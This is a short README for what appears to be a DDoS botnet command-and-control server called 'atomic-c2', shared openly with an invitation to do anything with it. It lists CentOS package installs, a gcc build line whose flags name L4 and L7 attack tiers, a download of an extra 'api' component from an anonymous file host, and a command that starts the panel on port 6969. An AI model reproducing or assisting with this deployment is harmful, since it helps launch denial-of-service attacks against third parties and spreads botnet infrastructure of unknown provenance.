# atomic-c2

- This is the same source that BOSS OK (Infinity Network) is using.

- DO WHATEVER YOU WANT WITH IT, ENJOY IT AS MUCH AS YOU CAN. :D

-Setup:

Need centos 7 linux.

- Download this: https://anonfiles.com/N8regaUcyf/api 
- And add it to Atomic API Funnel folder. (Too big for github.)

yum update -y
yum upgrade -y
yum install epel-release -y
yum install libcurl-devel -y
yum install json-c-devel -y


gcc Atomic/*.c -o AtomicCNC -lpthread -lcurl -Wall -D basicL4 -D basicL7 -D vipL4 -D vipL7 -D fmpL4 -D rawL4 -ljson-c -std=c99 -D DEBUG

screen ./AtomicCNC 6969

- Contact: https://t.me/weakapi
